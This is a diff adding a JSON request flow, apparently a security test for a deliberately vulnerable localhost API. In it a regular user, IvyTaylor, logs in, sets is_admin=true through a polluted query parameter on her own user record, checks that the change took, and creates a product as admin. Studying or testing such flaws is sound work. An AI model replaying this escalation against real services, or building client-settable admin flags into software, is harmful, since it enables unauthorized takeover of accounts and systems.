@@ -1,0 +1,61 @@
+{
+    "id": "flow_param_pollution_ivytaylor_admin_escalation",
+    "name": "Parameter Pollution: IvyTaylor (Regular User) Escalates to Admin",
+    "description": "IvyTaylor, a non-admin user, exploits parameter pollution to escalate her privileges to admin.",
+    "staticVars": {
+      "baseUrl": "http://localhost:8000",
+      "ivyUsername": "IvyTaylor",
+      "ivyPassword": "IvyPass9(",
+      "ivyUserId": "00000010-0000-0000-0000-000000000010",
+      "ivyEmail": "ivy.taylor@example.com"
+    },
+    "steps": [
+      {
+        "id": "step_login_ivytaylor_param_poll",
+        "name": "Login IvyTaylor",
+        "type": "request",
+        "method": "POST",
+        "url": "{{baseUrl}}/api/auth/login?username={{ivyUsername}}&password={{ivyPassword}}",
+        "onFailure": "stop",
+        "extract": {
+          "ivy_token": "body.access_token"
+        }
+      },
+      {
+        "id": "step_ivytaylor_escalate_to_admin_param_poll",
+        "name": "IvyTaylor Escalates to Admin via Parameter Pollution",
+        "type": "request",
+        "method": "PUT",
+        "url": "{{baseUrl}}/api/users/{{ivyUserId}}?email={{ivyEmail}}&is_admin=true",
+        "headers": {
+          "Authorization": "Bearer {{ivy_token}}"
+        },
+        "onFailure": "stop"
+      },
+      {
+        "id": "step_ivytaylor_verify_admin_status",
+        "name": "IvyTaylor Verifies Admin Status",
+        "type": "request",
+        "method": "GET",
+        "url": "{{baseUrl}}/api/users/{{ivyUserId}}",
+        "headers": {
+          "Authorization": "Bearer {{ivy_token}}"
+        },
+        "onFailure": "stop",
+        "extract": {
+          "ivy_is_admin": "body.is_admin"
+        }
+      },
+      {
+        "id": "step_ivytaylor_attempt_admin_action_create_product",
+        "name": "IvyTaylor (as Admin) Creates Product",
+        "type": "request",
+        "method": "POST",
+        "url": "{{baseUrl}}/api/products?name=IvyAdminProduct&price=0.01&description=AdminEscalationSuccess&category=Escalated",
+        "headers": {
+          "Authorization": "Bearer {{ivy_token}}"
+        },
+        "onFailure": "stop"
+      }
+    ]
+  }
